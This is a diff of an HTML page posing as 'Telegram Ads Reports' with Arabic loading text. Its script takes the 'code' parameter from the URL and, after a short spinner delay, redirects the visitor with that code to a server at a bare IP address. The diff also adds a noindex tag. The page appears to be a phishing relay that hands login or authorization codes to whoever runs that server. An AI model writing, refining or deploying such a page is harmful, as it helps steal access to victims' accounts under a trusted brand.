@@ -6,21 +6,27 @@ Index · HTML
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex">
 <title>Telegram Ads Reports</title>
+<style>
+html,body{height:100%;margin:0}
+body{background:#030b1d;color:#2f80ff;font-family:Tahoma,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;font-size:20px;font-weight:700;text-align:center}
+.sp{width:56px;height:56px;border:5px solid rgba(47,128,255,.25);border-top-color:#2f80ff;border-radius:50%;animation:s 1s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+</style>
 <script>
-// ✏️ حطي هنا رابط السيرفر بتاعك (من غير / في الآخر)
-// مثال: "http://123.45.67.89:8080"
 var SERVER = "http://217.154.36.84:7582";
- 
 var code = new URLSearchParams(location.search).get("code");
 if (code) {
-  location.replace(SERVER + "/telegram-ads-reports?code=" + encodeURIComponent(code));
+  setTimeout(function(){
+    location.replace(SERVER + "/telegram-ads-reports?code=" + encodeURIComponent(code));
+  }, 300);
 }
 </script>
 </head>
-<body style="background:#030b1d;color:#fff;font-family:Tahoma,sans-serif;text-align:center;padding:20vh 15px">
-جاري تحميل التقرير...
+<body>
+<div class="sp"></div>
+<div>جاري فتح التقرير الخاص بك...</div>
 </body>
 </html>
-
  
